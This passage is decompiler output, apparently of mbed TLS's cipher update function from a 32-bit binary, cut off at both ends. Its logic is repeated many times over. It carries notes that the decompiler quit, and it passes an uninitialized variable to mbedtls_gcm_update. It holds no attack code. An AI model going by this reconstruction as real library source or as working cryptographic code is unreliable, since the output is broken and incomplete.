                                    // branch -> 0x806a073
                                    // 0x806a073
                                    if (g5 == 0) {
                                        // 0x806a1a8
                                        g1 = 0;
                                        // branch -> 0x8069efd
                                    } else {
                                        // 0x806a07b
                                        v42 = g2;
                                        v13 = (int32_t *)(v42 - 36);
                                        *(int32_t *)(v42 - 40) = *v13;
                                        v28 = 0;
                                        if (*v13 != 0) {
                                            // 0x806a08a
                                            v28 = *(int32_t *)(*(int32_t *)(g2 - 36) + 24);
                                            // branch -> 0x806a090
                                        }
                                        // 0x806a090
                                        v27 = g5;
                                        v24 = v27 % v28;
                                        if (v24 != 0) {
                                            // 0x806a090
                                            v67 = v24;
                                            // branch -> 0x806a0ae
                                            // 0x806a0ae
                                            g5 = v27 - v67;
                                            g4 = g3 + 20;
                                            *(int32_t *)(g2 - 44) = v67;
                                            memcpy(v23, v22, (int32_t)v21);
                                            v15 = (int32_t *)(g3 + 36);
                                            *v15 = *v15 + *(int32_t *)(g2 - 44);
                                            v29 = g5;
                                            g237 = v29 == 0;
                                            if (v29 == 0) {
                                                // 0x806a1a8
                                                g1 = 0;
                                                // branch -> 0x8069efd
                                            } else {
                                                // 0x806a0d9
                                                *(int32_t *)(g2 - 40) = *(int32_t *)g3;
                                                v45 = g3;
                                                // branch -> 0x806a0e1
                                                // 0x806a0e1
                                                v46 = g2;
                                                v68 = *(int32_t *)(v46 - 28);
                                                v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                                *(int32_t *)(v46 - 32) = v69;
                                                v47 = g2;
                                                v70 = *(int32_t *)(v47 - 60);
                                                g6 = v70;
                                                v71 = *(int32_t *)(v45 + 8);
                                                v72 = *(int32_t *)(v47 - 32);
                                                g4 = v72;
                                                v73 = *(int32_t *)(g3 + 60);
                                                g1 = v73;
                                                v89 = *(int32_t *)(v72 + 8);
                                                ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v71, g5, v45 + 40, v70, v68);
                                                if (g1 == 0) {
                                                    // 0x806a11b
                                                    v16 = (int32_t *)g7;
                                                    *v16 = g5 + *v16;
                                                    // branch -> 0x8069efd
                                                }
                                            }
                                            // 0x8069efd
                                            v33 = g2;
                                            g3 = *(int32_t *)(v33 - 12);
                                            g7 = *(int32_t *)(v33 - 8);
                                            g5 = *(int32_t *)(v33 - 4);
                                            g2 = *(int32_t *)v33;
                                            return g1;
                                        }
                                        // 0x806a09a
                                        v43 = g3;
                                        v65 = *(int32_t *)(v43 + 8);
                                        g237 = v65 == 0;
                                        if (v65 == 0) {
                                            // 0x806a0a1
                                            v44 = g2;
                                            v14 = (int32_t *)(v44 - 36);
                                            v66 = *v14;
                                            g237 = v66 == 0;
                                            if (v66 != 0) {
                                                // 0x806a0a8
                                                v67 = *(int32_t *)(*v14 + 24);
                                                // branch -> 0x806a0ae
                                                // 0x806a0ae
                                                g5 = v27 - v67;
                                                g4 = v43 + 20;
                                                *(int32_t *)(v44 - 44) = v67;
                                                memcpy(v23, v22, (int32_t)v21);
                                                v15 = (int32_t *)(g3 + 36);
                                                *v15 = *v15 + *(int32_t *)(g2 - 44);
                                                v29 = g5;
                                                g237 = v29 == 0;
                                                if (v29 == 0) {
                                                    // 0x806a1a8
                                                    g1 = 0;
                                                    // branch -> 0x8069efd
                                                } else {
                                                    // 0x806a0d9
                                                    *(int32_t *)(g2 - 40) = *(int32_t *)g3;
                                                    v45 = g3;
                                                    // branch -> 0x806a0e1
                                                    // 0x806a0e1
                                                    v46 = g2;
                                                    v68 = *(int32_t *)(v46 - 28);
                                                    v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                                    *(int32_t *)(v46 - 32) = v69;
                                                    v47 = g2;
                                                    v70 = *(int32_t *)(v47 - 60);
                                                    g6 = v70;
                                                    v71 = *(int32_t *)(v45 + 8);
                                                    v72 = *(int32_t *)(v47 - 32);
                                                    g4 = v72;
                                                    v73 = *(int32_t *)(g3 + 60);
                                                    g1 = v73;
                                                    v89 = *(int32_t *)(v72 + 8);
                                                    ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v71, g5, v45 + 40, v70, v68);
                                                    if (g1 == 0) {
                                                        // 0x806a11b
                                                        v16 = (int32_t *)g7;
                                                        *v16 = g5 + *v16;
                                                        // branch -> 0x8069efd
                                                    }
                                                }
                                                // 0x8069efd
                                                v33 = g2;
                                                g3 = *(int32_t *)(v33 - 12);
                                                g7 = *(int32_t *)(v33 - 8);
                                                g5 = *(int32_t *)(v33 - 4);
                                                g2 = *(int32_t *)v33;
                                                return g1;
                                            }
                                        }
                                        // 0x806a0e1
                                        v46 = g2;
                                        v68 = *(int32_t *)(v46 - 28);
                                        v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                        *(int32_t *)(v46 - 32) = v69;
                                        v47 = g2;
                                        v70 = *(int32_t *)(v47 - 60);
                                        g6 = v70;
                                        v72 = *(int32_t *)(v47 - 32);
                                        g4 = v72;
                                        v73 = *(int32_t *)(g3 + 60);
                                        g1 = v73;
                                        v89 = *(int32_t *)(v72 + 8);
                                        ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v65, v27, v43 + 40, v70, v68);
                                        if (g1 == 0) {
                                            // 0x806a11b
                                            v16 = (int32_t *)g7;
                                            *v16 = g5 + *v16;
                                            // branch -> 0x8069efd
                                        }
                                    }
                                    // 0x8069efd
                                    v33 = g2;
                                    g3 = *(int32_t *)(v33 - 12);
                                    g7 = *(int32_t *)(v33 - 8);
                                    g5 = *(int32_t *)(v33 - 4);
                                    g2 = *(int32_t *)v33;
                                    return g1;
                                }
                                // 0x8069efd
                                v33 = g2;
                                g3 = *(int32_t *)(v33 - 12);
                                g7 = *(int32_t *)(v33 - 8);
                                g5 = *(int32_t *)(v33 - 4);
                                g2 = *(int32_t *)v33;
                                return g1;
                            }
                        }
                        // 0x8069ef8
                        g1 = -0x6100;
                        // branch -> 0x8069efd
                    }
                    // 0x8069efd
                    v33 = g2;
                    g3 = *(int32_t *)(v33 - 12);
                    g7 = *(int32_t *)(v33 - 8);
                    g5 = *(int32_t *)(v33 - 4);
                    g2 = *(int32_t *)v33;
                    return g1;
                }
                // 0x8069f34
                int32_t v98; // 0x806a0ee
                int32_t v99; // 0x806a0f5
                if (v9 == 6) {
                    // 0x806a180
                    *(int32_t *)g7 = g5;
                    g7 = v5;
                    int32_t v100 = g5; // 0x806a18b
                    g5 = v6;
                    int32_t v101 = *(int32_t *)(g3 + 60); // 0x806a197
                    g3 = v3;
                    int32_t v102;
                    mbedtls_gcm_update(v2, v102, (char *)v101, v100);
                    // branch -> 0x806a1a8
                    // 0x806a1a8
                    g1 = 0;
                    // branch -> 0x8069efd
                } else {
                    // 0x8069f3e
                    if (v4 == a4) {
                        // 0x806a25c
                        if (*(int32_t *)(g3 + 36) == 0) {
                            // 0x806a266
                            v49 = g2;
                            v84 = *(int32_t *)(v49 - 36);
                            g4 = v84;
                            if (g5 % *(int32_t *)(v84 + 24) == 0) {
                                v36 = v49;
                                v21 = v1;
                                v22 = a2;
                                v23 = a1;
                                // 0x8069f4a
                                v10 = (int32_t *)(v36 - 32);
                                v86 = *v10;
                                if (v86 != 2) {
                                    // 0x8069f50
                                    g237 = v86 == 3;
                                    if (v86 != 3) {
                                        // 0x8069f5a
                                        g237 = v86 == 5;
                                        if (v86 == 5) {
                                            // 0x8069f64
                                            v51 = *(int32_t *)(v36 - 28);
                                            v52 = *(int32_t *)(*(int32_t *)(v36 - 36) + 28);
                                            g1 = v52;
                                            v53 = *(int32_t *)(v36 - 60);
                                            g4 = v53;
                                            v34 = g3;
                                            v54 = *(int32_t *)(v34 + 60);
                                            g6 = v54;
                                            v87 = *(int32_t *)(v52 + 16);
                                            ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v87)(v54, g5, v34 + 36, v34 + 40, v34 + 20, v53, v51);
                                            if (g1 == 0) {
                                                // 0x8069fa2
                                                *(int32_t *)g7 = g5;
                                                // branch -> 0x8069efd
                                            }
                                        } else {
                                            // 0x806a140
                                            g237 = v86 == 7;
                                            g1 = -0x6080;
                                            if (v86 == 7) {
                                                // 0x806a14f
                                                v74 = *(int32_t *)(v36 - 28);
                                                g4 = v74;
                                                v75 = *(int32_t *)(*(int32_t *)(v36 - 36) + 28);
                                                g1 = v75;
                                                v76 = *(int32_t *)(g3 + 60);
                                                g6 = v76;
                                                v90 = *(int32_t *)(v75 + 20);
                                                ((int32_t (*)(int32_t, int32_t, int32_t, int32_t))v90)(v76, g5, *(int32_t *)(v36 - 60), v74);
                                                if (g1 == 0) {
                                                    // 0x806a178
                                                    *(int32_t *)g7 = g5;
                                                    // branch -> 0x8069efd
                                                }
                                            }
                                        }
                                        // 0x8069efd
                                        v33 = g2;
                                        g3 = *(int32_t *)(v33 - 12);
                                        g7 = *(int32_t *)(v33 - 8);
                                        g5 = *(int32_t *)(v33 - 4);
                                        g2 = *(int32_t *)v33;
                                        return g1;
                                    }
                                    // 0x806a1b0
                                    v77 = *(int32_t *)(v36 - 28);
                                    g4 = v77;
                                    v78 = *(int32_t *)(*(int32_t *)(v36 - 36) + 28);
                                    g1 = v78;
                                    v79 = *(int32_t *)(v36 - 60);
                                    v48 = g3;
                                    v80 = *(int32_t *)(v48 + 8);
                                    v81 = *(int32_t *)(v48 + 60);
                                    g6 = v81;
                                    v91 = *(int32_t *)(v78 + 12);
                                    ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v91)(v81, v80, g5, v48 + 36, v48 + 40, v79, v77);
                                    if (g1 != 0) {
                                        // 0x8069efd
                                        v33 = g2;
                                        g3 = *(int32_t *)(v33 - 12);
                                        g7 = *(int32_t *)(v33 - 8);
                                        g5 = *(int32_t *)(v33 - 4);
                                        g2 = *(int32_t *)v33;
                                        return g1;
                                    }
                                    // 0x8069fa2
                                    *(int32_t *)g7 = g5;
                                    // branch -> 0x8069efd
                                    // 0x8069efd
                                    v33 = g2;
                                    g3 = *(int32_t *)(v33 - 12);
                                    g7 = *(int32_t *)(v33 - 8);
                                    g5 = *(int32_t *)(v33 - 4);
                                    g2 = *(int32_t *)v33;
                                    return g1;
                                }
                                // 0x8069fb0
                                v35 = g3;
                                v55 = *(int32_t *)(v35 + 8);
                                if (v55 == 0) {
                                    // 0x8069fbb
                                    v56 = *(int32_t *)(v35 + 36);
                                    v18 = v56;
                                    v57 = *(int32_t *)(v36 - 36);
                                    g4 = v57;
                                    if (g5 + v56 <= *(int32_t *)(v57 + 24)) {
                                        // 0x806a205
                                        memcpy(v23, v22, (int32_t)v21);
                                        g1 = 0;
                                        v17 = (int32_t *)(g3 + 36);
                                        *v17 = g5 + *v17;
                                        // branch -> 0x8069efd
                                        // 0x8069efd
                                        v33 = g2;
                                        g3 = *(int32_t *)(v33 - 12);
                                        g7 = *(int32_t *)(v33 - 8);
                                        g5 = *(int32_t *)(v33 - 4);
                                        g2 = *(int32_t *)v33;
                                        return g1;
                                    }
                                    v25 = v56;
                                } else {
                                    // 0x806a128
                                    v82 = *(int32_t *)(v35 + 36);
                                    v18 = v82;
                                    if (v55 == 1) {
                                        // 0x806a1f3
                                        v83 = *(int32_t *)(v36 - 36);
                                        g4 = v83;
                                        if (g5 + v82 < *(int32_t *)(v83 + 24)) {
                                            // 0x806a205
                                            memcpy(v23, v22, (int32_t)v21);
                                            g1 = 0;
                                            v17 = (int32_t *)(g3 + 36);
                                            *v17 = g5 + *v17;
                                            // branch -> 0x8069efd
                                            // 0x8069efd
                                            v33 = g2;
                                            g3 = *(int32_t *)(v33 - 12);
                                            g7 = *(int32_t *)(v33 - 8);
                                            g5 = *(int32_t *)(v33 - 4);
                                            g2 = *(int32_t *)v33;
                                            return g1;
                                        }
                                        v25 = v82;
                                    } else {
                                        v25 = v82;
                                    }
                                }
                                // 0x8069fcd
                                if (v25 == 0) {
                                    // 0x806a073
                                    if (g5 == 0) {
                                        // 0x806a1a8
                                        g1 = 0;
                                        // branch -> 0x8069efd
                                    } else {
                                        // 0x806a07b
                                        v42 = g2;
                                        v13 = (int32_t *)(v42 - 36);
                                        *(int32_t *)(v42 - 40) = *v13;
                                        v28 = 0;
                                        if (*v13 != 0) {
                                            // 0x806a08a
                                            v28 = *(int32_t *)(*(int32_t *)(g2 - 36) + 24);
                                            // branch -> 0x806a090
                                        }
                                        // 0x806a090
                                        v27 = g5;
                                        v24 = v27 % v28;
                                        if (v24 != 0) {
                                            // 0x806a090
                                            v67 = v24;
                                            // branch -> 0x806a0ae
                                            // 0x806a0ae
                                            g5 = v27 - v67;
                                            g4 = g3 + 20;
                                            *(int32_t *)(g2 - 44) = v67;
                                            memcpy(v23, v22, (int32_t)v21);
                                            v15 = (int32_t *)(g3 + 36);
                                            *v15 = *v15 + *(int32_t *)(g2 - 44);
                                            v29 = g5;
                                            g237 = v29 == 0;
                                            if (v29 == 0) {
                                                // 0x806a1a8
                                                g1 = 0;
                                                // branch -> 0x8069efd
                                            } else {
                                                // 0x806a0d9
                                                *(int32_t *)(g2 - 40) = *(int32_t *)g3;
                                                v45 = g3;
                                                // branch -> 0x806a0e1
                                                // 0x806a0e1
                                                v46 = g2;
                                                v68 = *(int32_t *)(v46 - 28);
                                                v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                                *(int32_t *)(v46 - 32) = v69;
                                                v47 = g2;
                                                v70 = *(int32_t *)(v47 - 60);
                                                g6 = v70;
                                                v71 = *(int32_t *)(v45 + 8);
                                                v72 = *(int32_t *)(v47 - 32);
                                                g4 = v72;
                                                v73 = *(int32_t *)(g3 + 60);
                                                g1 = v73;
                                                v89 = *(int32_t *)(v72 + 8);
                                                ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v71, g5, v45 + 40, v70, v68);
                                                if (g1 == 0) {
                                                    // 0x806a11b
                                                    v16 = (int32_t *)g7;
                                                    *v16 = g5 + *v16;
                                                    // branch -> 0x8069efd
                                                }
                                            }
                                            // 0x8069efd
                                            v33 = g2;
                                            g3 = *(int32_t *)(v33 - 12);
                                            g7 = *(int32_t *)(v33 - 8);
                                            g5 = *(int32_t *)(v33 - 4);
                                            g2 = *(int32_t *)v33;
                                            return g1;
                                        }
                                        // 0x806a09a
                                        v43 = g3;
                                        v65 = *(int32_t *)(v43 + 8);
                                        g237 = v65 == 0;
                                        if (v65 == 0) {
                                            // 0x806a0a1
                                            v44 = g2;
                                            v14 = (int32_t *)(v44 - 36);
                                            v66 = *v14;
                                            g237 = v66 == 0;
                                            if (v66 != 0) {
                                                // 0x806a0a8
                                                v67 = *(int32_t *)(*v14 + 24);
                                                // branch -> 0x806a0ae
                                                // 0x806a0ae
                                                g5 = v27 - v67;
                                                g4 = v43 + 20;
                                                *(int32_t *)(v44 - 44) = v67;
                                                memcpy(v23, v22, (int32_t)v21);
                                                v15 = (int32_t *)(g3 + 36);
                                                *v15 = *v15 + *(int32_t *)(g2 - 44);
                                                v29 = g5;
                                                g237 = v29 == 0;
                                                if (v29 == 0) {
                                                    // 0x806a1a8
                                                    g1 = 0;
                                                    // branch -> 0x8069efd
                                                } else {
                                                    // 0x806a0d9
                                                    *(int32_t *)(g2 - 40) = *(int32_t *)g3;
                                                    v45 = g3;
                                                    // branch -> 0x806a0e1
                                                    // 0x806a0e1
                                                    v46 = g2;
                                                    v68 = *(int32_t *)(v46 - 28);
                                                    v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                                    *(int32_t *)(v46 - 32) = v69;
                                                    v47 = g2;
                                                    v70 = *(int32_t *)(v47 - 60);
                                                    g6 = v70;
                                                    v71 = *(int32_t *)(v45 + 8);
                                                    v72 = *(int32_t *)(v47 - 32);
                                                    g4 = v72;
                                                    v73 = *(int32_t *)(g3 + 60);
                                                    g1 = v73;
                                                    v89 = *(int32_t *)(v72 + 8);
                                                    ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v71, g5, v45 + 40, v70, v68);
                                                    if (g1 == 0) {
                                                        // 0x806a11b
                                                        v16 = (int32_t *)g7;
                                                        *v16 = g5 + *v16;
                                                        // branch -> 0x8069efd
                                                    }
                                                }
                                                // 0x8069efd
                                                v33 = g2;
                                                g3 = *(int32_t *)(v33 - 12);
                                                g7 = *(int32_t *)(v33 - 8);
                                                g5 = *(int32_t *)(v33 - 4);
                                                g2 = *(int32_t *)v33;
                                                return g1;
                                            }
                                        }
                                        // 0x806a0e1
                                        v46 = g2;
                                        v68 = *(int32_t *)(v46 - 28);
                                        v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                        *(int32_t *)(v46 - 32) = v69;
                                        v47 = g2;
                                        v70 = *(int32_t *)(v47 - 60);
                                        g6 = v70;
                                        v72 = *(int32_t *)(v47 - 32);
                                        g4 = v72;
                                        v73 = *(int32_t *)(g3 + 60);
                                        g1 = v73;
                                        v89 = *(int32_t *)(v72 + 8);
                                        ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v65, v27, v43 + 40, v70, v68);
                                        if (g1 == 0) {
                                            // 0x806a11b
                                            v16 = (int32_t *)g7;
                                            *v16 = g5 + *v16;
                                            // branch -> 0x8069efd
                                        }
                                    }
                                    // 0x8069efd
                                    v33 = g2;
                                    g3 = *(int32_t *)(v33 - 12);
                                    g7 = *(int32_t *)(v33 - 8);
                                    g5 = *(int32_t *)(v33 - 4);
                                    g2 = *(int32_t *)v33;
                                    return g1;
                                }
                                // 0x8069fd5
                                v50 = v35 + 20;
                                *v10 = v50;
                                v30 = v18;
                                v20 = *(int32_t *)(*(int32_t *)(v36 - 36) + 24) - v30;
                                g4 = v20;
                                g237 = v50 + v30 == 0;
                                *(int32_t *)(g2 - 44) = v20;
                                memcpy(v23, v22, (int32_t)v21);
                                v31 = *(int32_t *)g3;
                                *(int32_t *)(g2 - 36) = *(int32_t *)(v31 + 28);
                                v37 = g2;
                                v58 = *(int32_t *)(v37 - 28);
                                v59 = *(int32_t *)(v37 - 32);
                                v38 = g3;
                                v60 = *(int32_t *)(v31 + 24);
                                v61 = *(int32_t *)(v37 - 36);
                                g6 = v61;
                                v62 = *(int32_t *)(v38 + 8);
                                v63 = *(int32_t *)(v38 + 60);
                                g1 = v63;
                                v88 = *(int32_t *)(v61 + 8);
                                ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v88)(v63, v62, v60, v38 + 40, v59, v58);
                                v39 = g2;
                                g4 = *(int32_t *)(v39 - 44);
                                if (g1 == 0) {
                                    // 0x806a03d
                                    v19 = *(int32_t *)g3;
                                    *(int32_t *)(v39 - 32) = *(int32_t *)g7;
                                    v26 = v19;
                                    *(int32_t *)(g2 - 36) = v26;
                                    if (v26 == 0) {
                                        // 0x806a03d
                                        v64 = 0;
                                        // branch -> 0x806a050
                                    } else {
                                        // 0x806a04d
                                        v64 = *(int32_t *)(v19 + 24);
                                        // branch -> 0x806a050
                                    }
                                    // 0x806a050
                                    v40 = g2;
                                    *(int32_t *)g7 = *(int32_t *)(v40 - 32) + v64;
                                    v41 = g2;
                                    v85 = 0;
                                    if (*(int32_t *)(v40 - 36) != 0) {
                                        // 0x806a05e
                                        v85 = *(int32_t *)(*(int32_t *)(v41 - 36) + 24);
                                        // branch -> 0x806a064
                                    }
                                    // 0x806a064
                                    v11 = (int32_t *)(v41 - 28);
                                    *v11 = *v11 + v85;
                                    v32 = g4;
                                    g5 -= v32;
                                    v12 = (int32_t *)(g2 - 60);
                                    *v12 = *v12 + v32;
                                    *(int32_t *)(g3 + 36) = 0;
                                    // branch -> 0x806a073
                                    // 0x806a073
                                    if (g5 == 0) {
                                        // 0x806a1a8
                                        g1 = 0;
                                        // branch -> 0x8069efd
                                    } else {
                                        // 0x806a07b
                                        v42 = g2;
                                        v13 = (int32_t *)(v42 - 36);
                                        *(int32_t *)(v42 - 40) = *v13;
                                        v28 = 0;
                                        if (*v13 != 0) {
                                            // 0x806a08a
                                            v28 = *(int32_t *)(*(int32_t *)(g2 - 36) + 24);
                                            // branch -> 0x806a090
                                        }
                                        // 0x806a090
                                        v27 = g5;
                                        v24 = v27 % v28;
                                        if (v24 != 0) {
                                            // 0x806a090
                                            v67 = v24;
                                            // branch -> 0x806a0ae
                                            // 0x806a0ae
                                            g5 = v27 - v67;
                                            g4 = g3 + 20;
                                            *(int32_t *)(g2 - 44) = v67;
                                            memcpy(v23, v22, (int32_t)v21);
                                            v15 = (int32_t *)(g3 + 36);
                                            *v15 = *v15 + *(int32_t *)(g2 - 44);
                                            v29 = g5;
                                            g237 = v29 == 0;
                                            if (v29 == 0) {
                                                // 0x806a1a8
                                                g1 = 0;
                                                // branch -> 0x8069efd
                                            } else {
                                                // 0x806a0d9
                                                *(int32_t *)(g2 - 40) = *(int32_t *)g3;
                                                v45 = g3;
                                                // branch -> 0x806a0e1
                                                // 0x806a0e1
                                                v46 = g2;
                                                v68 = *(int32_t *)(v46 - 28);
                                                v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                                *(int32_t *)(v46 - 32) = v69;
                                                v47 = g2;
                                                v70 = *(int32_t *)(v47 - 60);
                                                g6 = v70;
                                                v71 = *(int32_t *)(v45 + 8);
                                                v72 = *(int32_t *)(v47 - 32);
                                                g4 = v72;
                                                v73 = *(int32_t *)(g3 + 60);
                                                g1 = v73;
                                                v89 = *(int32_t *)(v72 + 8);
                                                ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v71, g5, v45 + 40, v70, v68);
                                                if (g1 == 0) {
                                                    // 0x806a11b
                                                    v16 = (int32_t *)g7;
                                                    *v16 = g5 + *v16;
                                                    // branch -> 0x8069efd
                                                }
                                            }
                                            // 0x8069efd
                                            v33 = g2;
                                            g3 = *(int32_t *)(v33 - 12);
                                            g7 = *(int32_t *)(v33 - 8);
                                            g5 = *(int32_t *)(v33 - 4);
                                            g2 = *(int32_t *)v33;
                                            return g1;
                                        }
                                        // 0x806a09a
                                        v43 = g3;
                                        v65 = *(int32_t *)(v43 + 8);
                                        g237 = v65 == 0;
                                        if (v65 == 0) {
                                            // 0x806a0a1
                                            v44 = g2;
                                            v14 = (int32_t *)(v44 - 36);
                                            v66 = *v14;
                                            g237 = v66 == 0;
                                            if (v66 != 0) {
                                                // 0x806a0a8
                                                v67 = *(int32_t *)(*v14 + 24);
                                                // branch -> 0x806a0ae
                                                // 0x806a0ae
                                                g5 = v27 - v67;
                                                g4 = v43 + 20;
                                                *(int32_t *)(v44 - 44) = v67;
                                                memcpy(v23, v22, (int32_t)v21);
                                                v15 = (int32_t *)(g3 + 36);
                                                *v15 = *v15 + *(int32_t *)(g2 - 44);
                                                v29 = g5;
                                                g237 = v29 == 0;
                                                if (v29 == 0) {
                                                    // 0x806a1a8
                                                    g1 = 0;
                                                    // branch -> 0x8069efd
                                                } else {
                                                    // 0x806a0d9
                                                    *(int32_t *)(g2 - 40) = *(int32_t *)g3;
                                                    v45 = g3;
                                                    // branch -> 0x806a0e1
                                                    // 0x806a0e1
                                                    v46 = g2;
                                                    v68 = *(int32_t *)(v46 - 28);
                                                    v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                                    *(int32_t *)(v46 - 32) = v69;
                                                    v47 = g2;
                                                    v70 = *(int32_t *)(v47 - 60);
                                                    g6 = v70;
                                                    v71 = *(int32_t *)(v45 + 8);
                                                    v72 = *(int32_t *)(v47 - 32);
                                                    g4 = v72;
                                                    v73 = *(int32_t *)(g3 + 60);
                                                    g1 = v73;
                                                    v89 = *(int32_t *)(v72 + 8);
                                                    ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v71, g5, v45 + 40, v70, v68);
                                                    if (g1 == 0) {
                                                        // 0x806a11b
                                                        v16 = (int32_t *)g7;
                                                        *v16 = g5 + *v16;
                                                        // branch -> 0x8069efd
                                                    }
                                                }
                                                // 0x8069efd
                                                v33 = g2;
                                                g3 = *(int32_t *)(v33 - 12);
                                                g7 = *(int32_t *)(v33 - 8);
                                                g5 = *(int32_t *)(v33 - 4);
                                                g2 = *(int32_t *)v33;
                                                return g1;
                                            }
                                        }
                                        // 0x806a0e1
                                        v46 = g2;
                                        v68 = *(int32_t *)(v46 - 28);
                                        v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                        *(int32_t *)(v46 - 32) = v69;
                                        v47 = g2;
                                        v70 = *(int32_t *)(v47 - 60);
                                        g6 = v70;
                                        v72 = *(int32_t *)(v47 - 32);
                                        g4 = v72;
                                        v73 = *(int32_t *)(g3 + 60);
                                        g1 = v73;
                                        v89 = *(int32_t *)(v72 + 8);
                                        ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v65, v27, v43 + 40, v70, v68);
                                        if (g1 == 0) {
                                            // 0x806a11b
                                            v16 = (int32_t *)g7;
                                            *v16 = g5 + *v16;
                                            // branch -> 0x8069efd
                                        }
                                    }
                                    // 0x8069efd
                                    v33 = g2;
                                    g3 = *(int32_t *)(v33 - 12);
                                    g7 = *(int32_t *)(v33 - 8);
                                    g5 = *(int32_t *)(v33 - 4);
                                    g2 = *(int32_t *)v33;
                                    return g1;
                                }
                                // 0x8069efd
                                v33 = g2;
                                g3 = *(int32_t *)(v33 - 12);
                                g7 = *(int32_t *)(v33 - 8);
                                g5 = *(int32_t *)(v33 - 4);
                                g2 = *(int32_t *)v33;
                                return g1;
                            }
                        }
                        // 0x8069ef8
                        g1 = -0x6100;
                        // branch -> 0x8069efd
                        // Detected a possible infinite recursion (goto support failed); quitting...
                    } else {
                        // 0x8069f3e
                        v36 = g2;
                        v21 = v1;
                        v22 = a2;
                        v23 = a1;
                        // branch -> 0x8069f4a
                    }
                    // 0x8069f4a
                    v10 = (int32_t *)(v36 - 32);
                    v86 = *v10;
                    if (v86 == 2) {
                        // 0x8069fb0
                        v35 = g3;
                        v55 = *(int32_t *)(v35 + 8);
                        if (v55 == 0) {
                            // 0x8069fbb
                            v56 = *(int32_t *)(v35 + 36);
                            v18 = v56;
                            v57 = *(int32_t *)(v36 - 36);
                            g4 = v57;
                            if (g5 + v56 <= *(int32_t *)(v57 + 24)) {
                                // 0x806a205
                                memcpy(v23, v22, (int32_t)v21);
                                g1 = 0;
                                v17 = (int32_t *)(g3 + 36);
                                *v17 = g5 + *v17;
                                // branch -> 0x8069efd
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            } else {
                                v25 = v56;
                            }
                        } else {
                            // 0x806a128
                            v82 = *(int32_t *)(v35 + 36);
                            v18 = v82;
                            if (v55 == 1) {
                                // 0x806a1f3
                                v83 = *(int32_t *)(v36 - 36);
                                g4 = v83;
                                if (g5 + v82 < *(int32_t *)(v83 + 24)) {
                                    // 0x806a205
                                    memcpy(v23, v22, (int32_t)v21);
                                    g1 = 0;
                                    v17 = (int32_t *)(g3 + 36);
                                    *v17 = g5 + *v17;
                                    // branch -> 0x8069efd
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                } else {
                                    v25 = v82;
                                }
                            } else {
                                v25 = v82;
                            }
                        }
                        // 0x8069fcd
                        if (v25 == 0) {
                            // 0x806a073
                            if (g5 == 0) {
                                // 0x806a1a8
                                g1 = 0;
                                // branch -> 0x8069efd
                            } else {
                                // 0x806a07b
                                v42 = g2;
                                v13 = (int32_t *)(v42 - 36);
                                v18 = *v13;
                                *(int32_t *)(v42 - 40) = *v13;
                                v28 = 0;
                                if (v18 != 0) {
                                    // 0x806a08a
                                    v28 = *(int32_t *)(*(int32_t *)(g2 - 36) + 24);
                                    // branch -> 0x806a090
                                }
                                // 0x806a090
                                v27 = g5;
                                v24 = v27 % v28;
                                if (v24 == 0) {
                                    // 0x806a09a
                                    v43 = g3;
                                    v65 = *(int32_t *)(v43 + 8);
                                    v18 = v65;
                                    g237 = v65 == 0;
                                    if (v65 == 0) {
                                        // 0x806a0a1
                                        v44 = g2;
                                        v14 = (int32_t *)(v44 - 36);
                                        v66 = *v14;
                                        g237 = v66 == 0;
                                        if (v66 != 0) {
                                            // 0x806a0a8
                                            v67 = *(int32_t *)(*v14 + 24);
                                            // branch -> 0x806a0ae
                                            // 0x806a0ae
                                            g5 = v27 - v67;
                                            g4 = v43 + 20;
                                            *(int32_t *)(v44 - 44) = v67;
                                            memcpy(v23, v22, (int32_t)v21);
                                            v15 = (int32_t *)(g3 + 36);
                                            *v15 = *v15 + *(int32_t *)(g2 - 44);
                                            v29 = g5;
                                            g237 = v29 == 0;
                                            if (v29 == 0) {
                                                // 0x806a1a8
                                                g1 = 0;
                                                // branch -> 0x8069efd
                                            } else {
                                                // 0x806a0d9
                                                *(int32_t *)(g2 - 40) = *(int32_t *)g3;
                                                v45 = g3;
                                                v18 = *(int32_t *)(v45 + 8);
                                                v99 = g5;
                                                v98 = v45;
                                                // branch -> 0x806a0e1
                                                // 0x806a0e1
                                                v46 = g2;
                                                v68 = *(int32_t *)(v46 - 28);
                                                v69 = *(int32_t *)(*(int32_t *)(v46 - 40) + 28);
                                                *(int32_t *)(v46 - 32) = v69;
                                                v47 = g2;
                                                v70 = *(int32_t *)(v47 - 60);
                                                g6 = v70;
                                                v72 = *(int32_t *)(v47 - 32);
                                                g4 = v72;
                                                v73 = *(int32_t *)(g3 + 60);
                                                g1 = v73;
                                                v89 = *(int32_t *)(v72 + 8);
                                                ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))v89)(v73, v18, v99, v98 + 40, v70, v68);
                                                if (g1 == 0) {
                                                    // 0x806a11b
                                                    v16 = (int32_t *)g7;
                                                    *v16 = g5 + *v16;
